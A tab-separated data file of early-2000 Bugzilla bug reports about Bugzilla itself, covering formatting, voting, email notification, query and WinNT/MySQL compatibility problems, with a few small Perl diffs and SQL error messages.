27248%TAB%950177654%TAB%5051%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Creating/Changing Bugs%TAB%PATCH: Bug listings saved with .html extension,Bug listings saved with .html extension%TAB%PATCH: Bug listings saved with .html extension,Bug listings saved with .html extensionCould it be that the patch for long_list.cgi has a typos? http://lxr.mozilla.org/mozilla/source/webtools/bugzilla/long_list.cgi#40 reads print "Content-disposition: attachement; filename=bugzilla_bug_list.html\n\n"; whereas all the other instances say "attachment" instead. Don't know if this has any effect, but shouldn't it be uniform?
27420%TAB%950271808%TAB%9754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Interface%TAB%Component field should have COLSPAN in long_list.cgi%TAB%Component field should have COLSPAN in long_list.cgiWe find that the Component field of the long_list table output very frequently wraps onto more than one line, when it appears that there is plenty of room to fit it on one line.  In my understanding, Target Milestone is a short field (not longer than Component), so it should work to give COLSPAN=2 to the table cells for both Component and Target Milestone.  diff -r1.12 long_list.cgi 104c104 <         print "<TR><TD><B>Component:</B> $component\n"; --- >         print "<TR><TD COLSPAN=2><B>Component:</B> $component\n"; 106c106 <             print "<TD><B>Target milestone:</B>$target_milestone\n"; --- >             print "<TD COLSPAN=2><B>Target milestone:</B>$target_milestone\n";
27522%TAB%950360484%TAB%11573%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Clicking "create bugzilla entry form" doesn't work with M13%TAB%Clicking "create bugzilla entry form" doesn't work with M13I was filling out a bug for the sidebar using the new "easy" entry form, and couldn't submit the form using the "create bugzilla entry form" button, using M13 on redhat 5.2.
27669%TAB%950504319%TAB%9285%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Query should state how many matching bugs on top of result page%TAB%Query should state how many matching bugs on top of result pageWhen you search the bugzilla database for recorded bugs you sometimes make less intelligent queries resulting in maybe 800 matches. This is something you dont know until the results page is done loading which can be really annoying on a slow connection. My suggestion is that the amount of matching bugs should be printed at the top of the bug list so that you can stop, go back and make a more specific query if you see that you got a couple of hundred matches
28011%TAB%950691360%TAB%1698%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Bug Helper bugs are very hard to read, formatting should be improved%TAB%Bug Helper bugs are very hard to read, formatting should be improvedThe bugs I've seen from Bug Helper are much better, content-wise, but are very  hard to read, because the output is one big "blob" without line breaks to split  apart unrelated content.  This could be trivially improved by just adding three line breaks to split up the  segments e.g.:  User-Agent: Mozilla/4.7 [Kondara-ja] (X11; I; Linux 2.2.14-2k11 i686) BuildID:    2000021510  Text entry widget in Find Text dialog looks odd enough to imply that there is a drawing bug for the text entry widget. M13 for SunOS 5.6 also has exactly same problem.  Reproducible: Always  Steps to Reproduce: 1. Launch Mozilla 2. Activate Find Text dialog by "Search/Find On This Page..." 3. You will find the text entry widget for "Find Text" looks odd 4. Possibly there is an intention to give the text entry widget    "thunken" decoration. 5. However the intention simply fails to do so.
28175%TAB%950746825%TAB%22599%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%other,Bugzilla,Bugzilla-General%TAB%State change options disabled, if not logged in%TAB%State change options disabled, if not logged inIf I am not logged in, only the current state has an option box in the form.  This is particularly bad together with bug #18720. I'm almost never have the option to change the state (if I don't take special, annoying precautions.)
28184%TAB%950769684%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Change Several Bugs at Once...%TAB%Change Several Bugs at Once...or whateve that was...is gone... I cannot bulk move for component change  requested of me.  Is this gone now?
28276%TAB%950796350%TAB%3977%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Please add MozillaTranslator to the tools section%TAB%Please add MozillaTranslator to the tools sectionI think MozillaTranslator should be added to the Webtools section/product.
28285%TAB%950797371%TAB%3977%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Add "Language-Pack" as a product to bugzilla%TAB%Add "Language-Pack" as a product to bugzillawith the increased (to say the least) contributions of localizations, I think we  can expect a vast amount of bug regarding spelled error, mis translations and  the like for the different localizations.  I my opinion the right place for this kind of bug is currently  browser-internalization. But I suggest a adding a "Language-Pack" product under  bugzilla with the components being the different localizations.  the reason for this are (among other):  1. average users can have dificulties finding the right place  (browser-internalization) especially if they saw the error in e.g. mail-news  2. The sheer number of possible bug, this will most likely overwhelm the owner  of browser-internalization.  3. some bug reports might be written in the actual locale, or might be  missing information about which locale has the problem,and this will make it  harder to assign the rigth man,  image a bug like this:  "Jeg har lige downloadet den her MozScape ting, den er egentlig meget fed, og  oversættelsen er også god, Jeg synes dog 'navn på adressebog' skal laves om til  'adressebogens navn' Det lyder bedre"  how can easely assing this bug ?  * and with the number of localizations (38 at the time of writing) i think it is  worth the work  4. having it split up, can automate many of the assignments, plus it seems  logical to the avarege user.
28287%TAB%950798497%TAB%7279%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Run the remembered query broken.%TAB%Run the remembered query broken.Using Mozilla 2000021708 Bugzilla asks me to login after I select Run the remembered query and select a query. Oddly enough, because how did it know what querys were mine if I wan't already logged in?  Then logging in i get this: "Software error:Evil code attempted to write stuff to the shadow database. at globals.pl line 113. Please send mail to this site's webmaster for help."  This doesn't occur in N4.61 but Asa says it's broken on N4.7.  Also - if I add the remembered query to my footer it runs fine from there.
28299%TAB%950801052%TAB%3987%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla returns SQL error when voting (at least for my account)%TAB%Bugzilla returns SQL error when voting (at least for my account)Overview Description:    http://bugzilla.mozilla.org/showvotes.cgi?voteon=26103 produces   Steps to Reproduce:  1) Log on as 3jrgm@qlink.queensu.ca (if you can :-]) 2) Load http://bugzilla.mozilla.org/show_bug.cgi?id=26103 3) Click the link 'Vote for this bug'        http://bugzilla.mozilla.org/showvotes.cgi?voteon=26103   Actual Results:    I receive the votes page, but at the end of the page is this message:      INSERT INTO shadowlog (command) VALUES ('insert into votes (who, bug_id,          count) values (nnnn, 26103, 0)'): at globals.pl line 119.    where nnnn is my UID, which terry@mozilla.org knows, but I'll choose not to    publish it in this bug report.    However, I still get the 'Submit' button and vote text fields -- but if I    submit the bug (for one vote only), I get the above error a second time,   and my vote is not registered.  Expected Results:    Add my one vote to this bug.  Build Date & Platform Bug Found: Using Nav4.7 win95 (not a mozilla browser                                   issue)  Additional Information:     I realize this code is new today. I looked through the bug reports for    Bugzilla, but could not find this reported (which is odd, I would have    thought a lot of voting was going on -- perhaps it's something wrong/odd   with my account).     Note that I had had 2 votes removed from this bug report earlier today.    Also, note that I was "grandfathered" to have both the 'can confirm'    permission, and the 'can edit any field of any bug' permission (if any of    that makes a difference).      Thanks, Terry. Bugzilla Rocks!
28398%TAB%950866175%TAB%3794%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Email%TAB%Gotta be more careful when emailing state changes of dependant bugs.,Gotta be more careful when emailing state changes of dependent bugs.%TAB%Gotta be more careful when emailing state changes of dependant bugs.,Gotta be more careful when emailing state changes of dependent bugs.The below entertaining mail was generated.  I think what is happening (haven't looked at the code yet) is when bug B is changed to be dependent on bug A, then you get notified of all changes to bug A's state that happened ever since you last generated email diffs for bug *B*.  This is not particularly useful.  Date: Thu, 17 Feb 2000 17:47:16 -0800 (PST) From: bugzilla-daemon@mozilla.org To: pavlov@netscape.com Subject: [Bug 24890] Changed - Cannot dismiss sub-dialogs brought up from prefs panel  	(text/plain) http://bugzilla.mozilla.org/show_bug.cgi?id=24890  sairuh@netscape.com changed:             What    |Old Value                   |New Value ----------------------------------------------------------------------------   BugsThisDependsOn|                            |28083,28177  This bug depends on bug 28177, which changed state:             What    |Old Value                   |New Value ----------------------------------------------------------------------------              Status|NEW                         |RESOLVED          Resolution|                            |WORKSFORME              Status|RESOLVED                    |REOPENED          Resolution|WORKSFORME                  |              Status|REOPENED                    |NEW              Status|NEW                         |ASSIGNED              Status|ASSIGNED                    |RESOLVED          Resolution|                            |FIXED    ------- Additional Comments From sairuh@netscape.com  2000-02-17 17:47 ------- verif blocked by bugs 28177 and 28083.
28458%TAB%950883664%TAB%1833%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%using new email system, "New" bugs do not have CC or QA contact%TAB%using new email system, "New" bugs do not have CC or QA contactJust a minor nit... when an email notification for a new bug arrives (i.e. not a changed but bug a new one) the list of headers does not include the CC list or the QA contact. This would be useful information to have, and sometimes I wonder who else is on the CC  I'm not in QA but I would imagine this would also make it difficult to know if you're getting this notification because you're the QA contact or because you're on the CC...  I realize there are lots of headers already, but you could probably remove some of them because they are not even in the "Enter Bug" form, such as: keywords, Resolution, and status whiteboard. Those fields can only be accessed when you're changing an existing bug.  By the way, I LOVE the new email notification system :)
28469%TAB%950885197%TAB%3987%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Query for UNCONFIRMED returns a bug report in NEW state%TAB%Query for UNCONFIRMED returns a bug report in NEW stateNoticed this bit of "teething pain" for the new UNCONFIRMED state.  The URL in the bug_file_loc for this bug report is the result of a query.cgi, where I selected UNCONFIRMED for status, and sorted by Bug Number (although the sort is not the issue). [All other fields were left as the default value].  I get back 28 bugs (at this time). If you look through the list you will see bug #28421.  Click on that bug report, and you'll see that it's actually in the NEW state, and the assigned to field is now karnaze (not troy as it appears in the query result set).  [I was the one who confirmed the bug and reassigned to karnaze/HTMLFrames].  Not sure why the query result set is returning the stale information (and I quit Nav4.7, deleted my cache, restarted and re-ran the query -- I still see the wrong info in the result set -- so not a cache issue).  Thanks again, John  p.s. I did look for a dupl, but could not find one. p.p.s. I get the same result set using either Nav4 or mozilla
28497%TAB%950889885%TAB%4838%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Accepting bug as assigned, list doesn't update%TAB%Accepting bug as assigned, list doesn't updateA bug is assigned to me. I accept it. I view 'My bugs'. Bug is still listed as new.  I expect it to say 'ASSI'
28624%TAB%951059022%TAB%178851%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Email Settings config page inaccurate%TAB%Email Settings config page inaccurateThe Email Settings configuration page says that email is sent to the reporter and a few other people, but does not list the voters. I noticed that email is also sent to voters. Please add "voters" to that info/setting page. Thanks.
28627%TAB%951061028%TAB%8709%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%SImultaneous CONFIRM and assign to owner of selected component%TAB%SImultaneous CONFIRM and assign to owner of selected componentRight now you can reassign to a particular person and confirm a bug at the same time.  Would be nice if checking the box "and confirm bug (change status to NEW)" applied also to "Reassign bug to owner of selected component" (or if there was another checkbox for that selection).
28676%TAB%951126710%TAB%4681%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%reports should be added to cc list for duplicate bugs.,When a bug is marked duplicate, the reporter should be added to the bug that it duplicated.%TAB%reports should be added to cc list for duplicate bugs.,When a bug is marked duplicate, the reporter should be added to the bug that it duplicated.What I mean is the when a bug is marked duplicate, the reporter of that bug and  perhaps even its cc list should be added to the bug that the reports bug was a  duplicate of.
28701%TAB%951137159%TAB%2147%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Plus signs in Bugzilla helper texts turn into spaces%TAB%Plus signs in Bugzilla helper texts turn into spacesI was using the Bugzilla helper to file a build bug, which meant I was including the phrase "g++" a lot.  After I got through the build page, I discovered that every instance of "g++" had been changed to "g  " -- i.e., plus signs were converted to spaces.  I was able to fix this by hand on the actual bug reporting page, but this shouldn't be happening.  (The bug in question was 28699, if you're curious.)
28736%TAB%951146353%TAB%1689%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Email%TAB%Include bug summary in "dependency changed" mail%TAB%Include bug summary in "dependency changed" mailI love the new mail format. It would help, though, for "dependency changed"  mail to include the summary of the dependency bug.  Right now I know Bug A  "blah blah blah" (in subject) had its dependent bug XXXXX change state, but no  idea what bug XXXXX is.  While you're at it, a link to bug XXXXX in addition to the link to the  unchanged bug A would be helpful.
28763%TAB%951156401%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Query/Bug List%TAB%Query page, location of submit button%TAB%Query page, location of submit buttonThe submit button isn't the first button on the form ("or" is), so MSIE tries  to submit using "or" instead of "submit query". The user ends up back at the  query page, and after about 10 seconds, notices that his query is actually  still there but that the results aren't. He thinks his query returned no  results..  Anyway, suggested solution: add another "submit query" button above the boolean  chart stuff, and put a "or scroll down for more" to the right of that button.
28849%TAB%951217665%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%Add checkbox for "email me" instead of CC list if user can't edit bugs.,Users should not be able to CC/unCC anyone other than themselves if they can't edit bugs,Users should not be able to unCC anyone other than themselves if they can't edit bugs%TAB%Add checkbox for "email me" instead of CC list if user can't edit bugs.,Users should not be able to CC/unCC anyone other than themselves if they can't edit bugs,Users should not be able to unCC anyone other than themselves if they can't edit bugsUsers without the capability to edit a bug should not be able to remove other  users from the CC list, but should still be able to remove themselves.  A good  way to solve this would be add a checkbox for "Email me when this bug changes".   If the user has the capability to edit bugs, then they should still get the  existing textbox like we do currently, as well, but if the user doesn't have that  capability, or if they haven't logged in, then the CC list can be included in a  hidden field instead of a textbox, so that it still gets submitted with the  update, but the users don't have the opportunity to change it.  (This also helps  to protect the privacy of people who want themselves CC'd on a bug).  Then the  cgi can look at that checkbox and add or remove that person's name as necessary  when processing it.  (It would also have to be preset if their name was in the CC  list when they viewed it, if they were logged in at the time).
28882%TAB%951228343%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Votes policy change removes all votes if outside new policy limits.%TAB%Votes policy change removes all votes if outside new policy limits.I had about 2 bugs on bug #26943, and lots of other people had 5.  Because of the recent voting policy change, it has gone from a top ten position to way down the list.  A lot of people have been totally removed from the bug.  Please make it so that reductions in vote maxima set the new maximum votes on the bug rather than none.
28884%TAB%951229493%TAB%4403%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,User Interface%TAB%bug list show confidential bugs using color%TAB%bug list show confidential bugs using colorBugs with different confidentiality settings should show up in bug lists with  obvious distingushing marks, perhaps using different colors.  This will help keep humans from inadvertently disclosing information about these  bugs to inappropriate areas.
29064%TAB%951363433%TAB%11945%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Path Delimiter Problem Under WinNT%TAB%Path Delimiter Problem Under WinNTTesting Bugzilla under WinNT 4.0 Workstation, with ActiveState Perl 5.005_03.  In the CGI.pl library, under the subroutine "confirm_login" - the  setup of nexturl to be argv0 stripping everything up to and inculding the last  slash, does not work correctly due to WinNT Path delimeter.   Needed Change;  #Original   $0 =~ m:[^/]*$:; 	    $0 =~ m:[^\\]*$:;
29066%TAB%951364000%TAB%11945%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%MySql Encrypt() Function Returns NULL for WinNT%TAB%MySql Encrypt() Function Returns NULL for WinNTTesting Bugzilla under WinNT 4.0 Workstation, with ActiveState Perl 5.005_03. Using MySQL-Shareware for Win95/98. Version 2.32.22-shareware-debug.  In CGI.pl library within subroutine "confirm_login", the use of MySql Encrypt  function for password encryption fails. MySQL returns NULL.  Also occurs in globals.pl library within subroutine "InsertNewUser".   Required Changes to workaround;  -------- CGI.pl ---------- #original        SendSQL("SELECT encrypt(" . SqlQuote($enteredpwd) . ", " . #original                SqlQuote(substr($realcryptpwd, 0, 2)) . ")"); #original        my $enteredcryptpwd = FetchOneColumn();      my $enteredcryptpwd = crypt($enteredpwd, substr($realcryptpwd, 0, 2));  -------- globals.pl ---------- #original    SendSQL("insert into profiles (login_name, realname, password,              cryptpassword, groupset) values ($username, $realname, '$password',               encrypt('$password'), $groupset)");                   SendSQL("insert into profiles (login_name, realname, password,              cryptpassword, groupset) values ($username, $realname,              '$password','". crypt($password,$password)."', $groupset)");
29089%TAB%779086800%TAB%11996%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%<BLINK>This "system" is 'stress' `filled` & ``ugly''</BLINK>%TAB%<BLINK>This "system" is 'stress' `filled` & ``ugly''</BLINK>(This bug imported from BugSplat, Netscape's internal bugsystem.  It was known there as bug #1 http://scopus.netscape.com/bugsplat/show_bug.cgi?id=1 Imported into Bugzilla on 02/24/00 10:22)  All comments removed because I am on the CC list for this bug, and they annoy me. ------- Additional Comments From relliott  07/18/96 14:41 -------   *** Bug 26191 has been marked as a duplicate of this bug. ***   (This text added on 7/22 to test stripping out of bogus line terminators -- Terry) ------- Additional Comments From terry  01/26/97 11:19 -------   Testing setting of fix version, to see if mail gets sent correctly.  ------- Additional Comments From terry  01/26/97 11:20 -------   And now I remove the fix version, to again see what the mail looks like.  ------- Additional Comments From terry  04/01/97 11:10 -------   Moving this bug into the Dogbert product.  ------- Additional Comments From terry  04/01/97 11:12 -------   April fools!  Putting the bug back to BugSplat.  ------- Additional Comments From montulli  04/04/97 00:18 -------   *** Bug 46662 has been marked as a duplicate of this bug. ***  ------- Additional Comments From mtoy 04/15/97 09:42 -------  OK, here we go again ... *** A copy of this bug, #57624, has been opened against Dogbert ***   ------- Additional Comments From mtoy 04/15/97 10:13 -------   Make a copy again to test the target_fix_version setting thingg *** A copy of this bug, #57634, has been opened against Dogbert ***   ------- Additional Comments From richmond  Jul-01-1999 09:56 -------   *** Bug 357116 has been marked as a duplicate of this bug. ***  ------- Additional Comments From leaf  Oct-26-1999 09:31 -------   does bugsplat send nice mail still?
29217%TAB%951457175%TAB%22599%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Dates in ISO format aren't accepted%TAB%Dates in ISO format aren't acceptedReproduce: Enter "2000-02-14" as in the "dates" field of the query form.  Actual Result: "The string '2000­02-14' is not a legal date."  Expected Result: Accepted as Feb 14, 2000
29820%TAB%951912769%TAB%8709%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Remove "Changed" from email subject line%TAB%Remove "Changed" from email subject lineCan you remove the "Changed -" from the subject line, so that it is of the form "[Bug xxxx] Summary".  Would make it easier to recognize bugs from the subject line, which is otherwise truncated in the thread display.
29991%TAB%951972991%TAB%12140%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Severity-field in Bugzilla Helper not correctly taken over to enter_bug.cgi%TAB%Severity-field in Bugzilla Helper not correctly taken over to enter_bug.cgiIf i submit a bug using Bugzilla Helper (/quality/help/bug-form.html) and select "Trivial - A cosmetic problem..." from the severity-field the selection isn't correctly transferred to the enter_bug.cgi-script. The severity-field there shows "normal" instead.  To reproduce: 1. open http://www.mozilla.org/quality/help/bug-form.html 2. enter anything you like 3. select severity "trivial" 4. click on "Open Bugzilla Entry Form"  Result: Severity-field shows "normal"  Should be "trivial"
30187%TAB%952025851%TAB%10297%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Allow group members to set group when creating a bug%TAB%Allow group members to set group when creating a bugMembers of a group should be able to restrict the viewing of a bug to one or more  of the groups they are members of, when posting the bug.  Currently you have to  view the bug report after you submit it before you can do this.
30259%TAB%952068590%TAB%7724%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%MySQL 3.23 uses different date_format()%TAB%MySQL 3.23 uses different date_format()We're running Bugzilla for our internal use and when we upgraded (we have to) MySQL to 3.23.x, Bugzilla started to print "Opened: Y-m-d H:m" at bug detail form instead of "Opened: 2000-12-12 12:23". It's because function date_format is changed in 3.23, you have to use "%Y-%m-%d" instead. I don't know if it's possible to fix this (like fetching MySQL version at start and send Y or %Y depending on its value), I just wanted to let you know.
30345%TAB%952093287%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Creating/Changing Bugs%TAB%Can mark bugs duplicates of each other.,Can mark bugs duplicates of each other [dupe loops]%TAB%Can mark bugs duplicates of each other.,Can mark bugs duplicates of each other [dupe loops]I would expect that "duplicate" would be an acyclic relation.  However, I have marked bug #26942 and bug #30341 as duplicates of each other.  Does the bug system, know what bug something has been marked a dupe of, or is it just "RESOLVED/DUPLICATE", with an annotation?
30348%TAB%952093547%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%Request for a nicer message when product unknown in enter_bug.cgi.%TAB%Request for a nicer message when product unknown in enter_bug.cgi.Hmm, there isn't an "extremely trivial" severity ...  I often type the above URL manually to save time, but sometimes mistype.  It used to give a enter_bug screen with no data on it (eg no components), but now it gives an error.  Either way it would be nice to get an error saying that you mistyped it.  Even better if you get shown a list of close (fuzzy search?) matches.
30480%TAB%952204025%TAB%3822%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Query/Bug List%TAB%Query page needs way to show dependent bug list,[RFE] add 'show dependencies as buglist' link to query.cgi and showdependencytree.cgi,[RFE] add 'show dependencies as buglist' link to showdependencytree.cgi%TAB%Query page needs way to show dependent bug list,[RFE] add 'show dependencies as buglist' link to query.cgi and showdependencytree.cgi,[RFE] add 'show dependencies as buglist' link to showdependencytree.cgiWhile I like the dependency tree I can get by going to the parent bug, it's  missing a lot of stuff that's necessary for bug management.  I'd like to be able  to get a normal query result page for all the bugs dependent on the named parent  bug.  It would be OK if this were a link on the parent bug next to the existing  link for the dependency tree.  This enhancement would take the place of the current procedure of:  go to parent bug,  scroll down to dependency list, copy bug list from text edit field to clipboard, go to query page, scroll down to "only" bugs field, paste list into the text field, submit query.  The other alternative is ugly, painful pseudo-keywords in the summary so you can  query on the summary line.  Setting this up is difficult and error prone since  you must visit every bug and summaries sometimes get changed by others.
30489%TAB%952208456%TAB%9699%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%The form misdetects the browser version%TAB%The form misdetects the browser versionWhen I enter in new bugs into the database with mozilla M14, it detects it as: Mozilla/5.0 (Windows; N; NT4.0; en-US) Mozilla/m13. I suspect that this is a problem with the browser, and not the website since the page uses the server user-agent string. This problem is repeatable. I am running the Win32 version of Mozilla M14 on Windows NT 4.0 SP6a.
30597%TAB%952272179%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,User Interface%TAB%"votes" should not be a hyperlink%TAB%"votes" should not be a hyperlinkThe word "votes" in a bug summary should not be a hyperlink to the  votehelp.html, because it draws much more attention than the number of votes  (which is what you really want to click on).  If someone wants to find out what  votes are, they can click on "Help! I don't understand this voting stuff" after  clicking on the number of votes.
30689%TAB%952330352%TAB%12635%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Query/Bug List%TAB%Javascript error with certain characters in array.%TAB%Javascript error with certain characters in array.
30731%TAB%952345991%TAB%3881%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%resolution kept in mass reassignment of resolved bugs,status not kept in mass reassignment of resolved bugs%TAB%resolution kept in mass reassignment of resolved bugs,status not kept in mass reassignment of resolved bugsI'm filing this since I'm under the impression that Bugzilla is no longer designed to handle open bugs with a resolution.  It seems that mass reassignment of a bug that is RESOLVED-LATER can cause the bug to change to NEW without clearing the resolution.  See diffs below.  (BTW, it would be nice to be able to reassign LATER/REMIND bugs without reopening them.)    http://bugzilla.mozilla.org/show_bug.cgi?id=10713  *** shadow/10713        Thu Jan 20 14:41:41 2000 --- shadow/10713.tmp.3292       Mon Mar  6 11:50:25 2000 *************** *** 3,14 ****   Version: other   Platform: All   OS/Version: All ! Status: RESOLVED      Resolution: LATER   Severity: normal   Priority: P5   Component: Layout ! AssignedTo: kipp@netscape.com                               ReportedBy: tom@dizoglio.com                  QAContact: vidur@netscape.com   TargetMilestone: M15 --- 3,14 ----   Version: other   Platform: All   OS/Version: All ! Status: NEW      Resolution: LATER   Severity: normal   Priority: P5   Component: Layout ! AssignedTo: buster@netscape.com                               ReportedBy: tom@dizoglio.com                  QAContact: vidur@netscape.com   TargetMilestone: M15 *************** *** 42,44 **** --- 42,47 ----   Migrating from {css2} to css2 keyword. The {css1}, {css2}, {css3} and {css-moz}   radars should now be considered deprecated in favour of keywords.   I am *really* sorry about the spam... +  + ------- Additional Comments From buster@netscape.com  2000-03-06 11:50 -------+ mine now
30799%TAB%952376751%TAB%9073%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Cannot confirm bugs even though I have permission%TAB%Cannot confirm bugs even though I have permissionI got the "Can confirm bug" permission. I tried several times to confirm unconfirmed bugs, but each time I get this message (on a red background):  Only the owner or submitter of the bug, or a sufficiently empowered user, may make that change to the bug_status field. Old value: UNCONFIRMED New value: NEW  I verified on http://bugzilla.mozilla.org/userprefs.cgi?bank=permissions that the "can confirm a bug" permission was set.  I'm using Navigator 4.7 to access bugzilla.
30823%TAB%952396040%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Software Error On Advanced Querying,Advanced query conditions on dependencies are ignored.,Advanced query conditions on dependencies and CCs are ignored.%TAB%Software Error On Advanced Querying,Advanced query conditions on dependencies are ignored.,Advanced query conditions on dependencies and CCs are ignored.Bah.  Just my luck.  The first time I use Bugzilla advanced querying and I broke it.   SELECT bugs.bug_id, bugs.groupset, date_format(bugs.delta_ts,'Y-m-d'), map_reporter.login_name, substring(bugs.bug_status,1,4), substring(bugs.resolution,1,4), substring(bugs.component, 1, 8), substring(bugs.product, 1, 8), bugs.votes, bugs.target_milestone, substring(bugs.short_desc, 1, 60) FROM bugs, profiles map_assigned_to, profiles map_reporter LEFT JOIN profiles map_qa_contact ON bugs.qa_contact = map_qa_contact.userid WHERE bugs.assigned_to = map_assigned_to.userid AND bugs.reporter = map_reporter.userid AND bugs.groupset & 192 = bugs.groupset AND (INSTR(blocked, '18054')) GROUP BY bugs.bug_id ORDER BY bugs.delta_ts, bugs.priority, bugs.bug_severity: Unknown column 'blocked' in 'where clause' at globals.pl line 135.
30825%TAB%952396908%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Jammed quips%TAB%Jammed quipsSomeone has jammed about 1000 existing quips together, including several <IMG>s, and submitted them ten times.  Perhaps a quip size limit is in order?
30826%TAB%952397060%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Sometimes getting old-style notifications still.,Old style notifications still sent to QA contacts%TAB%Sometimes getting old-style notifications still.,Old style notifications still sent to QA contactsIt appears when someone submits a bug to Webtools, I'm getting my QA Contact mail as an old-style notification.  When I submit to Webtools, it comes through as new-style.
30865%TAB%952423175%TAB%1869%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General,attachment and request management%TAB%Can't open attachment in bugzilla%TAB%Can't open attachment in bugzillaTried using mozilla 3/7 build and Netscape 4.72 Read bug 30796 Click on "message as text/plain" (or direct URL given above) Get error message:  Internal Server ErrorThe server encountered an internal error or  misconfiguration and was unable to complete your request.  Please contact the server administrator, risto@mozilla.org and inform them of  the time the error occurred, and anything you might have done that may have  caused the error.  More information about this error may be available in the server error log.  Apache/1.3.12 Server at bugzilla.mozilla.org Port 80  -- I sent email to risto and he said I should file this on you.
30889%TAB%952429529%TAB%4153%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Software error in Bugzilla when sorting by 'Importance'%TAB%Software error in Bugzilla when sorting by 'Importance'I tried running my usual query on Bugzilla this morning. This is the message I received:  Please stand by ...  Content-type: text/html  Software error:  Invalid order: 'Importance' at /opt/webtools/bugzilla/buglist.cgi line 891.  I ran this query using Opera 3.61 on Windows 95, if that is significant.
30893%TAB%952432045%TAB%6303%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%error generating footer for bug list%TAB%error generating footer for bug listWhen reloading a bug list for "namedcmd=Unconfirmed+in+Browser+less+than+7+days" (what you'd expect) on Mozilla's Bugzilla the following followed the list  itself (this was the last such query by me on 2000-03-06):  ------------  292 bugs found.   [Long Format]Query Page   Enter New Bug   Change columnsContent-type: text/html   Software error:  select (bit & 192) != 0 from groups where name = 'editbugs': Table  'shadow_bugs.groups' doesn't exist at globals.pl line 135.   Please send mail to this site's webmaster for help.
31081%TAB%952527792%TAB%22599%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Make comment field in bug view larger%TAB%Make comment field in bug view largerOften, I have to add large comments to bugs (10 lines and longer, this time nearly 50), and the tiny comment field is annoying, especially together with some wierd render bug of 4.7. Please make it bigger, e.g. double the size. Tnx.
